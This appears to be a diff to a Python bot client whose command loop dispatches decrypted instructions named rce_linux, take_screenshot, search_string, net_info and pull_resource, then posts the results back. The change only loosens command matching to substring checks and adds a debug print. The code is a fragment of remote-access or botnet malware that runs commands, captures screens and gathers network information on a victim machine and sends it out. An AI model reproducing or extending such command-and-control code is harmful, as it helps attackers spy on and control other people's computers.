@@ -96,13 +96,15 @@ class Bot():
         command_array = []
         for index in xrange(len(plaintext)):
             plaintext[index] = plaintext[index].replace(b'\0', '')
-            if plaintext[index] == "rce_linux" or plaintext[index] == "take_screenshot" or plaintext[index] == "search_string" or plaintext[index] == "net_info" or plaintext[index] == "rce_linux" or plaintext[index] == "pull_resource":
+            if plaintext[index].find("rce_linux") != -1 or plaintext[index].find("take_screenshot") != -1 or \
+               plaintext[index].find("search_string") != -1 or plaintext[index].find("net_info") != -1 or \
+               plaintext[index].find("rce_linux") != -1 or plaintext[index].find("pull_resource") != -1:
 
                 command_array.append(plaintext[index])
                 plaintext[index+1] = plaintext[index+1].replace(b'\0', '')
                 plaintext[index+1] = plaintext[index+1].rstrip('3')
                 command_array.append(plaintext[index+1])
-
+        print command_array
         return command_array
 
 
@@ -164,26 +166,26 @@ if __name__ == "__main__":
                 count+=1
                 continue
 
-            if item == 'take_screenshot':
+            if item.find('take_screenshot') != -1:
                 bender.take_screenshot()
                 bender.post_data()
 
-            elif item == 'search_string':
+            elif item.find('search_string') != -1:
                 #This might need to change depending on the order of the items in the array
                 bender.search_string(command[count+1])
                 bender.post_data()
 
 
-            elif item == 'net_info':
+            elif item.find('net_info') != -1:
                 bender.net_info()
                 bender.post_data()
 
-            elif item == 'rce_linux':
+            elif item.find('rce_linux') != -1:
                 #This might need to change depending on the order of the items in the array
                 bender.rce_linux(command[count+1])
                 bender.post_data()
 
-            elif item == 'pull_resource':
+            elif item.find('pull_resource') != -1:
                 bender.pull_resource(command[count+1])
 
             count+=1
